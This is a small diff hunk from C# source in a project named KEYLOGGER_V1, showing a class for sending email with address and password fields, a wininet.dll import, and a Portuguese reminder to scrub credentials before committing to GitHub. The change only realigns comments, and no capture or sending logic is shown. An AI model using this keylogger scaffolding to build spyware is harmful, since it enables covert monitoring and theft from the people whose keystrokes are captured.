@@ -9,18 +9,18 @@ namespace KEYLOGGER_V1
 {
     public class c_Enviar_Email
     {
-        public c_Enviar_Email()                           //METODO CONSTRUTOR: Sem parametros.
+        public c_Enviar_Email()                                              //METODO CONSTRUTOR: Sem parametros.
         {
 
         }
-        public c_Enviar_Email(String Email, String Senha) //METODO CONSTRUTOR: Com parametros.
+        public c_Enviar_Email(String Email, String Senha)                    //METODO CONSTRUTOR: Com parametros.
         {
             _Email = Email;
             _Senha = Senha;
         }
 
        
-        string _Email = "";   // NAO ESQUEÇA DE APAGAR AO COMITAR NO GITHUB ;) CONSELHO!!
+        string _Email = "";                                                  // NAO ESQUEÇA DE APAGAR AO COMITAR NO GITHUB ;) CONSELHO!!
         string _Senha = "";
 
         [DllImport("wininet.dll")]
